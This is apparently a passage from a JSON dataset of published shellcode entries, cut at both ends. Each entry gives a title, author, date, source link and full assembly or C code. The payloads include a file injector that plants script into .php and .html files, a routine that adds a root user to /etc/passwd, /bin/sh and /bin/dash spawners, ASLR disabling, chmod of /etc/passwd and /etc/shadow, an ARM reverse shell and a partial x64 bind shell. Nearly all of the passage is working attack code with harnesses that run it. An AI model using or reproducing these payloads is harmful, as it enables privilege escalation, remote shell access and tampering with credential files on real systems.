;", ";======================================================================;               ", ".check_php:     ", "                xor eax, eax", "                push eax", "                push DWORD 0x7068702e   ; .php", "               ", "                mov esi, esp         ", "                ", "                call substr", "                ", "                cmp BYTE al, 2", "                je .do_inject", "                ", "                jmp .while ", "", ";======================================================================;", ";                               do_inject                              ;", ";======================================================================;", ".do_inject: ", "                jmp SHORT .your_code", "                ", ".write:  ", "                pop  esi    ; Get the address of your code into esi", "                ", "                call inject", "                ", "                jmp .while", "", ";======================================================================;  ", ";                               your_code                              ;", ";======================================================================;", " .your_code:", "               call .write", "                                                                                              ", "; Here a place for your code. Its size should be allocated in the", "; register dl. Look at the \"inject\" function.                                                               ", "                                                                                               ", "db '<html><script>alert(\"pwn3d\")<script></html>' ;<- You can change it.", "", "; Dont't forget to change the size of your code!", "------------------------------------------------------------------------ ", "                         ", "             ", "              Below is presented the shellcode equivalent.", "                              ", "", "#include <stdio.h>", "", "char shellcode[] = ", "                            ", "    \"\\x31\\xc0\\x50\\x83\\xec\\x01\\xc6\\x04\\x24\\x2f\\x89\\xe3\\xb0\\x0c\\xcd\\x80\"", "    \"\\x31\\xc0\\x50\\x83\\xec\\x01\\xc6\\x04\\x24\\x2e\\xeb\\x02\\xeb\\x63\\xe8\\xf9\"", "    \"\\xff\\xff\\xff\\x31\\xc0\\x31\\xdb\\xb0\\x01\\xcd\\x80\\x31\\xc0\\x89\\xfb\\x31\"", "    \"\\xc9\\xb1\\x02\\xb0\\x05\\xcd\\x80\\x31\\xdb\\x89\\xc3\\x31\\xc9\\x31\\xc0\\x99\"", "    \"\\xb2\\x02\\xb0\\x13\\xcd\\x80\\x31\\xc0\\x89\\xf1\\xb2\\x2b\\xb0\\x04\\xcd\\x80\" ", "    \"\\x31\\xc0\\xb0\\x06\\xcd\\x80\\xc3\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x42\\x8a\"", "    \"\\x1c\\x17\\x84\\xdb\\x74\\x1a\\x3a\\x1e\\x75\\xf4\\x8a\\x04\\x0e\\x8a\\x1c\\x17\"", "    \"\\x84\\xc0\\x74\\x08\\x41\\x42\\x38\\xc3\\x74\\xf0\\xeb\\x04\\x31\\xc0\\xb0\\x02\"", "    \"\\xc3\\x55\\x89\\xe5\\xb0\\xfa\\x29\\xc4\\x31\\xc0\\x31\\xc9\\x8d\\x5d\\x08\\xb0\"", "    \"\\x05\\xcd\\x80\\x85\\xc0\\x78\\x22\\x89\\x45\\x0c\\x8b\\x75\\x0c\\x89\\xf3\\x31\"", "    \"\\xc0\\x31\\xc9\\x8d\\x4c\\x24\\x64\\xb0\\x59\\xcd\\x80\\x85\\xc0\\x75\\x19\\x31\"", "    \"\\xc0\\x31\\xdb\\x89\\xf3\\xb0\\x06\\xcd\\x80\\x31\\xc0\\x50\\x66\\x68\\x2e\\x2e\"", "    \"\\x89\\xe3\\xb0\\x0c\\xcd\\x80\\xc9\\xc3\\x8d\\x54\\x24\\x6e\\x81\\x3a\\x70\\x72\"", "    \"\\x6f\\x63\\x74\\xc6\\x80\\x3a\\x2e\\x75\\x05\\xe9\\xbc\\xff\\xff\\xff\\x89\\xd3\"", "    \"\\x89\\xe1\\x31\\xc0\\xb0\\xc4\\xcd\\x80\\x66\\xb9\\xff\\xef\\x66\\xbb\\xff\\x9f\"", "    \"\\x41\\x43\\x8b\\x44\\x24\\x10\\x66\\x21\\xc8\\x66\\x39\\xd8\\x75\\x05\\xe9\\x97\"", "    \"\\xff\\xff\\xff\\x31\\xc0\\x50\\x83\\xec\\x01\\xc6\\x04\\x24\\x2e\\x89\\xd3\\xb0\"", "    \"\\x0c\\xcd\\x80\\x85\\xc0\\x75\\x0a\\xe8\\x65\\xff\\xff\\xff\\xe9\\x79\\xff\\xff\" ", "    \"\\xff\\x31\\xc0\\x89\\xd3\\x31\\xc9\\xb1\\x02\\xb0\\x21\\xcd\\x80\\x85\\xc0\\x74\"", "    \"\\x05\\xe9\\x64\\xff\\xff\\xff\\x31\\xc0\\x50\\x68\\x68\\x74\\x6d\\x6c\\x83\\xec\"", "    \"\\x01\\xc6\\x04\\x24\\x2e\\x89\\xe6\\x89\\xd7\\xe8\\x09\\xff\\xff\\xff\\x3c\\x02\"", "    \"\\x74\\x18\\x31\\xc0\\x50\\x68\\x2e\\x70\\x68\\x70\\x89\\xe6\\xe8\\xf6\\xfe\\xff\"", "    \"\\xff\\x3c\\x02\\x74\\x05\\xe9\\x30\\xff\\xff\\xff\\xeb\\x0b\\x5e\\xe8\\xb9\\xfe\"", "    \"\\xff\\xff\\xe9\\x23\\xff\\xff\\xff\\xe8\\xf0\\xff\\xff\\xff\"", "    // <html><script>alert(\"pwn3d\")<script></html>", "    \"\\x3c\\x68\\x74\\x6d\\x6c\\x3e\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3e\\x61\\x6c\"", "    \"\\x65\\x72\\x74\\x28\\x22\\x70\\x77\\x6e\\x33\\x64\\x22\\x29\\x3c\\x73\\x63\\x72\"", "    \"\\x69\\x70\\x74\\x3e\\x3c\\x2f\\x68\\x74\\x6d\\x6c\\x3e\";", "    ", "int main()", "{   ", "  printf(\"%d\\n\", strlen(shellcode));", "  (*(void (*)()) shellcode)();", "  return 0;", "}"]},
{"Title": "Linux/x64 - Add Root User (t0r/Winner) To /etc/passwd Shellcode (189 bytes)", "Author": "0_o", "Published": ": 2012-03-12", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-801.php", "View": null, "code": [";sc_adduser01.S", ";Arch:\t\t\tx86_64, Linux", ";", ";Author:\t\t0_o -- null_null", ";\t\t\tnu11.nu11 [at] yahoo.com", ";Date:\t\t\t2012-03-05", ";", ";compile an executable:\tnasm -f elf64 sc_adduser.S", ";\t\t\tld -o sc_adduser sc_adduser.o", ";compile an object:\tnasm -o sc_adduser_obj sc_adduser.S", ";", ";Purpose:\t\tadds user \"t0r\" with password \"Winner\" to /etc/passwd", ";executed syscalls: \tsetreuid, setregid, open, write, close, exit", ";Result:\t\tt0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash", ";syscall op codes:\t/usr/include/x86_64-linux-gnu/asm/unistd_64.h", "", "", "BITS 64", "", "[SECTION .text]", "", "global _start", "", "_start:", "", "\t;sys_setreuid(uint ruid, uint euid)", "        xor     rax,    rax", "        mov     al,     113                     ;syscall sys_setreuid", "        xor     rbx,    rbx                     ;arg 1 -- set real uid to root", "        mov     rcx,    rbx                     ;arg 2 -- set effective uid to root", "        syscall", "", "        ;sys_setregid(uint rgid, uint egid)", "        xor     rax,    rax", "        mov     al,     114                     ;syscall sys_setregid", "\txor     rbx,    rbx                     ;arg 1 -- set real uid to root", "        mov     rcx,    rbx                     ;arg 2 -- set effective uid to root", "        syscall", "\t", "\t;push all strings on the stack prior to file operations.", "\txor\trbx,\trbx", "\tmov     ebx,    0x647773FF", "        shr     rbx,    8", "        push    rbx                             ;string \\00dws", "        mov     rbx,    0x7361702f6374652f", "        push    rbx                             ;string sap/cte/", "\tmov     rbx,    0x0A687361622F6EFF", "        shr     rbx,    8", "        push    rbx                             ;string \\00\\nhsab/n", "        mov     rbx,    0x69622F3A746F6F72", "        push    rbx                             ;string ib/:toor", "        mov     rbx,    0x2F3A3A303A303A67", "        push    rbx                             ;string /::0:0:g", "\tmov\trbx,\t0x46556B554B587435", "\tpush\trbx\t\t\t\t;string FUkUKXt5", "\tmov\trbx,\t0x546755333A723074", "\tpush\trbx\t\t\t\t;string TgU3:r0t", "\t", "\t;prelude to doing anything useful...", "\tmov\trbx,\trsp\t\t\t;save stack pointer for later use", "\tpush\trbp\t\t\t\t;store base pointer to stack so it can be restored later", "\tmov\trbp,\trsp\t\t\t;set base pointer to current stack pointer", "\t", "\t;sys_open(char* fname, int flags, int mode)", "\tsub\trsp,\t\t16", "\tmov\t[rbp - 16],\trbx\t\t;store pointer to \"t0r..../bash\"", "\tmov\tsi,\t\t0x0401\t\t;arg 2 -- flags", "\tmov\trdi,\t\trbx", "\tadd\trdi,\t\t40\t\t;arg 1 -- pointer to \"/etc/passwd\"", "\txor\trax,\t\trax", "\tmov\tal,\t\t2\t\t;syscall sys_open", "\tsyscall", "\t", "\t;sys_write(uint fd, char* buf, uint size)", "\tmov\t[rbp - 4],\teax\t\t;arg 1 -- fd is retval of sys_open. save fd to stack for later use.", "\tmov\trcx,\t\trbx\t\t;arg 2 -- load rcx with pointer to string \"t0r.../bash\"", "\txor\trdx,\t\trdx", "\tmov\tdl,\t\t39\t\t;arg 3 -- load rdx with size of string \"t0r.../bash\\00\"", "\tmov\trsi,\t\trcx\t\t;arg 2 -- move to source index register", "\tmov\trdi,\t\trax\t\t;arg 1 -- move to destination index register", "\txor     rax,            rax", "        mov     al,             1               ;syscall sys_write", "        syscall", "\t", "\t;sys_close(uint fd)", "\txor\trdi,\t\trdi", "\tmov\tedi,\t\t[rbp - 4]\t;arg 1 -- load stored file descriptor to destination index register", "\txor\trax,\t\trax", "\tmov\tal,\t\t3\t\t;syscall sys_close", "\tsyscall", "\t", "\t;sys_exit(int err_code)", "\txor\trax,\trax", "\tmov\tal,\t60\t\t\t;syscall sys_exit", "\txor\trbx,\trbx\t\t\t;arg 1 -- error code", "\tsyscall", "\t", "\t", "\t", "\t", ";char shellcode[] =", ";\t\"\\x48\\x31\\xc0\\xb0\\x71\\x48\\x31\\xdb\\x48\\x31\\xc9\\x0f\\x05\\x48\\x31\"", ";\t\"\\xc0\\xb0\\x72\\x48\\x31\\xdb\\x48\\x31\\xc9\\x0f\\x05\\x48\\x31\\xdb\\xbb\"", ";\t\"\\xff\\x73\\x77\\x64\\x48\\xc1\\xeb\\x08\\x53\\x48\\xbb\\x2f\\x65\\x74\\x63\"", ";\t\"\\x2f\\x70\\x61\\x73\\x53\\x48\\xbb\\xff\\x6e\\x2f\\x62\\x61\\x73\\x68\\x0a\"", ";\t\"\\x48\\xc1\\xeb\\x08\\x53\\x48\\xbb\\x72\\x6f\\x6f\\x74\\x3a\\x2f\\x62\\x69\"", ";\t\"\\x53\\x48\\xbb\\x67\\x3a\\x30\\x3a\\x30\\x3a\\x3a\\x2f\\x53\\x48\\xbb\\x35\"", ";\t\"\\x74\\x58\\x4b\\x55\\x6b\\x55\\x46\\x53\\x48\\xbb\\x74\\x30\\x72\\x3a\\x33\"", ";\t\"\\x55\\x67\\x54\\x53\\x48\\x89\\xe3\\x55\\x48\\x89\\xe5\\x48\\x83\\xec\\x10\"", ";\t\"\\x48\\x89\\x5d\\xf0\\x66\\xbe\\x01\\x04\\x48\\x89\\xdf\\x48\\x83\\xc7\\x28\"", ";\t\"\\x48\\x31\\xc0\\xb0\\x02\\x0f\\x05\\x89\\x45\\xfc\\x48\\x89\\xd9\\x48\\x31\"", ";\t\"\\xd2\\xb2\\x27\\x48\\x89\\xce\\x48\\x89\\xc7\\x48\\x31\\xc0\\xb0\\x01\\x0f\"", ";\t\"\\x05\\x48\\x31\\xff\\x8b\\x7d\\xfc\\x48\\x31\\xc0\\xb0\\x03\\x0f\\x05\\x48\"", ";\t\"\\x31\\xc0\\xb0\\x3c\\x48\\x31\\xdb\\x0f\\x05\";", ";", ";equivalent code:", ";", ";char shellcode[] =", ";\t\"\\x48\\x31\\xc0\\xb0\\x71\\x48\\x31\\xdb\\x48\\x89\\xd9\\x0f\\x05\\x48\\x31\"", ";\t\"\\xc0\\xb0\\x72\\x48\\x31\\xdb\\x48\\x89\\xd9\\x0f\\x05\\x48\\x31\\xdb\\xbb\"", ";\t\"\\xff\\x73\\x77\\x64\\x48\\xc1\\xeb\\x08\\x53\\x48\\xbb\\x2f\\x65\\x74\\x63\"", ";\t\"\\x2f\\x70\\x61\\x73\\x53\\x48\\xbb\\xff\\x6e\\x2f\\x62\\x61\\x73\\x68\\x0a\"", ";\t\"\\x48\\xc1\\xeb\\x08\\x53\\x48\\xbb\\x72\\x6f\\x6f\\x74\\x3a\\x2f\\x62\\x69\"", ";\t\"\\x53\\x48\\xbb\\x67\\x3a\\x30\\x3a\\x30\\x3a\\x3a\\x2f\\x53\\x48\\xbb\\x35\"", ";\t\"\\x74\\x58\\x4b\\x55\\x6b\\x55\\x46\\x53\\x48\\xbb\\x74\\x30\\x72\\x3a\\x33\"", ";\t\"\\x55\\x67\\x54\\x53\\x48\\x89\\xe3\\x55\\x48\\x89\\xe5\\x48\\x83\\xec\\x10\"", ";\t\"\\x48\\x89\\x5d\\xf0\\x66\\xbe\\x01\\x04\\x48\\x89\\xdf\\x48\\x83\\xc7\\x28\"", ";\t\"\\x48\\x31\\xc0\\xb0\\x02\\x0f\\x05\\x89\\x45\\xfc\\x48\\x89\\xd9\\x48\\x31\"", ";\t\"\\xd2\\xb2\\x27\\x48\\x89\\xce\\x48\\x89\\xc7\\x48\\x31\\xc0\\xb0\\x01\\x0f\"", ";\t\"\\x05\\x48\\x31\\xff\\x8b\\x7d\\xfc\\x48\\x31\\xc0\\xb0\\x03\\x0f\\x05\\x48\"", ";\t\"\\x31\\xc0\\xb0\\x3c\\x48\\x31\\xdb\\x0f\\x05\";"]},
{"Title": "Linux/x86 - execve(/bin/dash) Shellcode (42 bytes)", "Author": "X-h4ck", "Published": ": 2012-05-16", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/18885.c", "View": "https://old.exploit-db.com/raw/18885/", "code": ["/*", " ", "linux/x86 execve(/bin/dash) 42 bytes", "Author        : X-h4ck ", "                mem001@live.com, mem003@live.com", "                www.pirate.al , www.flashcrew.in", "Greetz        : mywisdom - Danzel - Wulns~ - IllyrianWarrior- Ace - M4yh3m - Saldeath", "                ev1lut1on - Lekosta - Pretorian - bi0 - Slimshaddy - d3trimentaL ", "                CR - Hack-Down - H3ll - d4nte_sA - th3p0wer and all PirateAL friends.", "PROUD TO BE ALBANIAN!", "Linux bt 3.2.6 #1 SMP Fri Feb 17 10:40:05 EST 2012 i686 GNU/Linux", " ", "root@bt:~/Desktop# objdump -D sh", "", "sh:     file format elf32-i386", "", "", "Disassembly of section .text:", "", "08048060 <.text>:", " 8048060:    eb 19                    jmp    0x804807b", " 8048062:    5b                       pop    %ebx", " 8048063:    b8 00 00 00 00           mov    $0x0,%eax", " 8048068:    88 43 09                 mov    %al,0x9(%ebx)", " 804806b:    89 5b 0a                 mov    %ebx,0xa(%ebx)", " 804806e:    89 43 0e                 mov    %eax,0xe(%ebx)", " 8048071:    b0 0b                    mov    $0xb,%al", " 8048073:    8d 4b 0a                 lea    0xa(%ebx),%ecx", " 8048076:    8d 53 0e                 lea    0xe(%ebx),%edx", " 8048079:    cd 80                    int    $0x80", " 804807b:    e8 e2 ff ff ff           call   0x8048062", " 8048080:    2f                       das    ", " 8048081:    62 69 6e                 bound  %ebp,0x6e(%ecx)", " 8048084:    2f                       das    ", " 8048085:    64                       fs", " 8048086:    61                       popa   ", " 8048087:    73 68                    jae    0x80480f1 ", " ", "*/", " ", "#include <stdio.h>", "", "", "char sc[] = \"\\xeb\\x19\\x5b\\xb8\\x00\\x00\\x00\\x00\\x88\"", "            \"\\x43\\x09\\x89\\x5b\\x0a\\x89\\x43\\x0e\\xb0\"", "            \"\\x0b\\x8d\\x4b\\x0a\\x8d\\x53\\x0e\\xcd\\x80\"", "            \"\\xe8\\xe2\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\"", "            \"\\x2f\\x64\\x61\\x73\\x68\";", "void main(void)", "{", "       void(*s)(void);", "       printf(\"madhesia : %d\\n\", sizeof(sc));", "       s = sc;", "       s();", "}"]},
{"Title": "Linux/x86 - Disable ASLR Security Shellcode (83 bytes)", "Author": "Jean Pascal Pereira", "Published": ": 2012-08-02", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-813.php", "View": null, "code": ["/*", "Title:\tLinux x86 ASLR deactivation - 83 bytes", "Author:\tJean Pascal Pereira <pereira@secbiz.de>", "Web:\thttp://0xffe4.org", "", "", "Disassembly of section .text:", "", "08048060 <_start>:", " 8048060:       31 c0                   xor    %eax,%eax", " 8048062:       50                      push   %eax", " 8048063:       68 70 61 63 65          push   $0x65636170", " 8048068:       68 76 61 5f 73          push   $0x735f6176", " 804806d:       68 69 7a 65 5f          push   $0x5f657a69", " 8048072:       68 6e 64 6f 6d          push   $0x6d6f646e", " 8048077:       68 6c 2f 72 61          push   $0x61722f6c", " 804807c:       68 65 72 6e 65          push   $0x656e7265", " 8048081:       68 79 73 2f 6b          push   $0x6b2f7379", " 8048086:       68 6f 63 2f 73          push   $0x732f636f", " 804808b:       68 2f 2f 70 72          push   $0x72702f2f", " 8048090:       89 e3                   mov    %esp,%ebx", " 8048092:       66 b9 bc 02             mov    $0x2bc,%cx", " 8048096:       b0 08                   mov    $0x8,%al", " 8048098:       cd 80                   int    $0x80", " 804809a:       89 c3                   mov    %eax,%ebx", " 804809c:       50                      push   %eax", " 804809d:       66 ba 30 3a             mov    $0x3a30,%dx", " 80480a1:       66 52                   push   %dx", " 80480a3:       89 e1                   mov    %esp,%ecx", " 80480a5:       31 d2                   xor    %edx,%edx", " 80480a7:       42                      inc    %edx", " 80480a8:       b0 04                   mov    $0x4,%al", " 80480aa:       cd 80                   int    $0x80", " 80480ac:       b0 06                   mov    $0x6,%al", " 80480ae:       cd 80                   int    $0x80", " 80480b0:       40                      inc    %eax", " 80480b1:       cd 80                   int    $0x80", "", "", "", "*/", "", "#include <stdio.h>", "", "char shellcode[] = \"\\x31\\xc0\\x50\\x68\\x70\\x61\\x63\\x65\\x68\\x76\\x61\\x5f\\x73\\x68\"", "                   \"\\x69\\x7a\\x65\\x5f\\x68\\x6e\\x64\\x6f\\x6d\\x68\\x6c\\x2f\\x72\\x61\"", "                   \"\\x68\\x65\\x72\\x6e\\x65\\x68\\x79\\x73\\x2f\\x6b\\x68\\x6f\\x63\\x2f\"", "                   \"\\x73\\x68\\x2f\\x2f\\x70\\x72\\x89\\xe3\\x66\\xb9\\xbc\\x02\\xb0\\x08\"", "                   \"\\xcd\\x80\\x89\\xc3\\x50\\x66\\xba\\x30\\x3a\\x66\\x52\\x89\\xe1\\x31\"", "                   \"\\xd2\\x42\\xb0\\x04\\xcd\\x80\\xb0\\x06\\xcd\\x80\\x40\\xcd\\x80\";", "", "", "int main()", "{", "  fprintf(stdout,\"Lenght: %d\\n\",strlen(shellcode));", "  (*(void  (*)()) shellcode)();", "}"]},
{"Title": "Linux/x86 - chmod 666 /etc/passwd + /etc/shadow Shellcode (57 bytes)", "Author": "Jean Pascal Pereira", "Published": ": 2012-08-02", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-812.php", "View": null, "code": ["/*", "Title:\tLinux x86 chmod 666 /etc/passwd & /etc/shadow - 57 bytes", "Author:\tJean Pascal Pereira <pereira@secbiz.de>", "Web:\thttp://0xffe4.org", "", "", "Disassembly of section .text:", "", "08048060 <_start>:", " 8048060:       31 c0                   xor    %eax,%eax", " 8048062:       66 b9 b6 01             mov    $0x1b6,%cx", " 8048066:       50                      push   %eax", " 8048067:       68 73 73 77 64          push   $0x64777373", " 804806c:       68 2f 2f 70 61          push   $0x61702f2f", " 8048071:       68 2f 65 74 63          push   $0x6374652f", " 8048076:       89 e3                   mov    %esp,%ebx", " 8048078:       b0 0f                   mov    $0xf,%al", " 804807a:       cd 80                   int    $0x80", " 804807c:       31 c0                   xor    %eax,%eax", " 804807e:       50                      push   %eax", " 804807f:       68 61 64 6f 77          push   $0x776f6461", " 8048084:       68 2f 2f 73 68          push   $0x68732f2f", " 8048089:       68 2f 65 74 63          push   $0x6374652f", " 804808e:       89 e3                   mov    %esp,%ebx", " 8048090:       b0 0f                   mov    $0xf,%al", " 8048092:       cd 80                   int    $0x80", " 8048094:       31 c0                   xor    %eax,%eax", " 8048096:       40                      inc    %eax", " 8048097:       cd 80                   int    $0x80", "", "", "", "*/", "", "#include <stdio.h>", "", "char shellcode[] = \"\\x31\\xc0\\x66\\xb9\\xb6\\x01\\x50\\x68\\x73\\x73\\x77\\x64\"", "                   \"\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\"", "                   \"\\xb0\\x0f\\xcd\\x80\\x31\\xc0\\x50\\x68\\x61\\x64\\x6f\\x77\"", "                   \"\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\"", "                   \"\\xb0\\x0f\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";", "", "", "int main()", "{", "  fprintf(stdout,\"Lenght: %d\\n\",strlen(shellcode));", "  (*(void  (*)()) shellcode)();", "}"]},
{"Title": "Linux/ARM (Raspberry Pi) - Reverse (10.1.1.2:0x1337/TCP) Shell (/bin/sh) Shellcode (72 bytes)", "Author": "midnitesnake", "Published": ": 2012-09-11", "Platform": "ARM", "Download": "http://shell-storm.org/shellcode/files/shellcode-821.php", "View": null, "code": ["/*", "Title:     Linux/ARM - reverse_shell(tcp,10.1.1.2,0x1337)", "execve(\"/bin/sh\", [0], [0 vars]) - 72 bytes", "Date:      2012-09-08", "Tested on: ARM1176JZF-S (v6l) - Raspberry Pi", "Author:    midnitesnake", "", "00008054 <_start>:", "    8054:       e28f1001        add     r1, pc, #1", "    8058:       e12fff11        bx      r1", "    805c:       2002            movs    r0, #2", "    805e:       2101            movs    r1, #1", "    8060:       1a92            subs    r2, r2, r2", "    8062:       020f            lsls    r7, r1, #8", "    8064:       3719            adds    r7, #25", "    8066:       df01            svc     1", "    8068:       1c06            adds    r6, r0, #0", "    806a:       a108            add     r1, pc, #32     ; (adr r1,", "808c <Dup+0x16>)", "    806c:       2210            movs    r2, #16", "    806e:       3702            adds    r7, #2", "    8070:       df01            svc     1", "    8072:       273f            movs    r7, #63 ; 0x3f", "    8074:       2102            movs    r1, #2", "", "00008076 <Dup>:", "    8076:       1c30            adds    r0, r6, #0", "    8078:       df01            svc     1", "    807a:       3901            subs    r1, #1", "    807c:       d5fb            bpl.n   8076 <Dup>", "    807e:       a005            add     r0, pc, #20     ; (adr r0,", "8094 <Dup+0x1e>)", "    8080:       1a92            subs    r2, r2, r2", "    8082:       b405            push    {r0, r2}", "    8084:       4669            mov     r1, sp", "    8086:       270b            movs    r7, #11", "    8088:       df01            svc     1", "    808a:       46c0            nop                     ; (mov r8, r8)", "    808c:       37130002        .word   0x37130002", "    8090:       0301010a        .word   0x0301010a", "    8094:       6e69622f        .word   0x6e69622f", "    8098:       0068732f        .word   0x0068732f", "    809c:       00              .byte   0x00", "    809d:       00              .byte   0x00", "    809e:       46c0            nop                     ; (mov r8, r8)", "*/", "#include <stdio.h>", "#include <string.h>", "", "#define SWAP16(x)       ((x) << 8 | ((x) >> 8))", "", "const unsigned char sc[] = {", "", "        0x01, 0x10, 0x8F, 0xE2,", "        0x11, 0xFF, 0x2F, 0xE1,", "", "        0x02, 0x20, 0x01, 0x21,", "        0x92, 0x1a, 0x0f, 0x02,", "        0x19, 0x37, 0x01, 0xdf,", "        0x06, 0x1c, 0x08, 0xa1,", "        0x10, 0x22, 0x02, 0x37,", "        0x01, 0xdf, 0x3f, 0x27,", "        0x02, 0x21,", "", "        0x30, 0x1c, 0x01, 0xdf,", "        0x01, 0x39, 0xfb, 0xd5,", "        0x05, 0xa0, 0x92, 0x1a,", "        0x05, 0xb4, 0x69, 0x46,", "        0x0b, 0x27,0x01, 0xdf,", "        0xc0, 0x46,", "", "        /* struct sockaddr */", "        0x02, 0x00,", "        /* port: 0x1337 */", "        0x13, 0x37,", "        /* ip: 10.1.1.2 */", "        0x0A, 0x01, 0x01, 0x02,", "", "        /* \"/bin/sh\\0\" */", "        0x2f, 0x62, 0x69, 0x6e,0x2f, 0x73, 0x68, 0x00", "};", "", "int main()", "{", "        printf(\"shellcode=%d bytes\\n\"", "               \"connecting to %d.%d.%d.%d:%hd\\n\", sizeof sc,", "                sc[0x3c], sc[0x3d], sc[0x3e], sc[0x3f],", "                SWAP16(*((unsigned short *)(sc+0x3a))));", "        return ((int (*)(void))sc)();", "}"]},
{"Title": "Linux/ARM (Raspberry Pi) - execve(\"/bin/sh\", [0], [0 vars]) Shellcode (30 bytes)", "Author": "midnitesnake", "Published": ": 2012-09-11", "Platform": "ARM", "Download": "http://shell-storm.org/shellcode/files/shellcode-819.php", "View": null, "code": ["/*", "Title:     Linux/ARM - execve(\"/bin/sh\", [0], [0 vars]) - 30 bytes", "Date:      2012-09-08", "Tested on: ARM1176JZF-S (v6l)", "Author:    midnitesnake", "", "00008054 <_start>:", "    8054:       e28f6001        add     r6, pc, #1", "    8058:       e12fff16        bx      r6", "    805c:       4678            mov     r0, pc", "    805e:       300a            adds    r0, #10", "    8060:       9001            str     r0, [sp, #4]", "    8062:       a901            add     r1, sp, #4", "    8064:       1a92            subs    r2, r2, r2", "    8066:       270b            movs    r7, #11", "    8068:       df01            svc     1", "    806a:       2f2f            .short  0x2f2f", "    806c:       2f6e6962        .word   0x2f6e6962", "    8070:       00006873        .word   0x00006873", "*/", "#include <stdio.h>", "", "char *SC =      \"\\x01\\x60\\x8f\\xe2\"", "                \"\\x16\\xff\\x2f\\xe1\"", "                \"\\x78\\x46\"", "                \"\\x0a\\x30\"", "                \"\\x01\\x90\"", "                \"\\x01\\xa9\"", "                \"\\x92\\x1a\"", "                \"\\x0b\\x27\"", "                \"\\x01\\xdf\"", "                \"\\x2f\\x2f\"", "                \"\\x62\\x69\"", "                \"\\x6e\\x2f\"", "                \"\\x73\\x68\\x00\\x00\";", "", "int main(void)", "{", "        fprintf(stdout,\"Length: %d\\n\",strlen(SC));", "        (*(void(*)()) SC)();", "return 0;", "}"]},
{"Title": "Linux/ARM (Raspberry Pi) - chmod 0777 /etc/shadow Shellcode (41 bytes)", "Author": "midnitesnake", "Published": ": 2012-09-11", "Platform": "ARM", "Download": "http://shell-storm.org/shellcode/files/shellcode-820.php", "View": null, "code": ["/*", "Title:     Linux/ARM - chmod(\"/etc/shadow\", 0777) - 41 bytes", "Date:      2012-09-08", "Tested on: ARM1176JZF-S (v6l)", "Author:    midnitesnake", "", "00008054 <_start>:", "    8054:       e28f6001        add     r6, pc, #1", "    8058:       e12fff16        bx      r6", "    805c:       4678            mov     r0, pc", "    805e:       3012            adds    r0, #18", "    8060:       21ff            movs    r1, #255        ; 0xff", "    8062:       31ff            adds    r1, #255        ; 0xff", "    8064:       3101            adds    r1, #1", "    8066:       270f            movs    r7, #15", "    8068:       df01            svc     1", "    806a:       1b24            subs    r4, r4, r4", "    806c:       1c20            adds    r0, r4, #0", "    806e:       2701            movs    r7, #1", "    8070:       df01            svc     1", "    8072:       652f            .short  0x652f", "    8074:       732f6374        .word   0x732f6374", "    8078:       6f646168        .word   0x6f646168", "    807c:       46c00077        .word   0x46c00077", "*/", "#include <stdio.h>", "", "", "char shellcode[] = \"\\x01\\x60\\x8f\\xe2\"", "                   \"\\x16\\xff\\x2f\\xe1\"", "                   \"\\x78\\x46\"", "                   \"\\x12\\x30\"", "                   \"\\xff\\x21\"", "                   \"\\xff\\x31\"", "                   \"\\x01\\x31\"", "                   \"\\x0f\\x27\"", "                   \"\\x01\\xdf\"", "                   \"\\x24\\x1b\"", "                   \"\\x20\\x1c\"", "                   \"\\x01\\x27\"", "                   \"\\x01\\xdf\"", "                   \"\\x2f\\x65\"", "                   \"\\x74\\x63\\x2f\\x73\"", "                   \"\\x68\\x61\\x64\\x6f\"", "                   \"\\x77\\x00\"", "                   \"\\xc0\\x46\";", "", "int main()", "{", "        fprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "        (*(void(*)()) shellcode)();", "", "return 0;", "}"]},
{"Title": "Linux/x64 - Bind (31337/TCP) Shell Shellcode (150 bytes)", "Author": "Russell Willis", "Published": ": 2012-10-04", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-858.php", "View": null, "code": ["/*", "Title   : tcpbindshell  (150 bytes)", "Date    : 04 October 2013", "Author  : Russell Willis <codinguy@gmail.com>", "Testd on: Linux/x86_64 (SMP Debian 3.2.46-1+deb7u1 x86_64 GNU/Linux)", "", "$ objdump -D tcpbindshell -M intel", "tcpbindshell:     file format elf64-x86-64", "Disassembly of section .text:", "", "0000000000400080 <_start>:", "  400080:   48 31 c0                xor    rax,rax", "  400083:   48 31 ff                xor    rdi,rdi", "  400086:   48 31 f6                xor    rsi,rsi", "  400089:   48 31 d2                xor    rdx,rdx", "  40008c:   4d 31 c0                xor    r8,r8", "  40008f:   6a 02                   push   0x2", "  400091:   5f                      pop    rdi", "  400092:   6a 01                   push   0x1", "  400094:   5e                      pop    rsi", "  400095:   6a 06                   push   0x6", "  400097:   5a                      pop    rdx", "  400098:   6a 29                   push   0x29", "  40009a:   58                      pop    rax", "  40009b:   0f 05                   syscall ", "  40009d:   49 89 c0                mov    r8,rax", "  4000a0:   4d 31 d2                xor    r10,r10", "  4000a3:   41 52                   push   r10", "  4000a5:   41 52                   push   r10", "  4000a7:   c6 04 24 02             mov    BYTE PTR [rsp],0x2", "  4000ab:   66 c7 44 24 02 7a 69    mov    WORD PTR [rsp+0x2],0x697a", "  4000b2:   48 89 e6                mov    rsi,rsp", "  4000b5:   41 50                   push   r8", "  4000b7:   5f                      pop    rdi", "  4000b8:   6a 10                   push   0x10", "  4000ba:   5a                      pop    rdx", "  4000bb:   6a 31                   push   0x31", "  4000bd:   58                      pop    rax", "  4000be:   0f 05                   syscall ", "  4000c0:   41 50                   push   r8", "  4000c2:   5f                      pop    rdi", "  4000c3:   6a 01                   push   0x1", "  4000c5:   5e                      pop    rsi", "  4000c6:   6a 32                   push   0x32", "  4000c8:   58                      pop    rax", "  4000c9:   0f 05                   syscall ", "  4000cb:   48 89 e6                mov    rsi,rsp", "  4000ce:   48 31 c9                xor    rcx,rcx", "  4000d1:   b1 10                 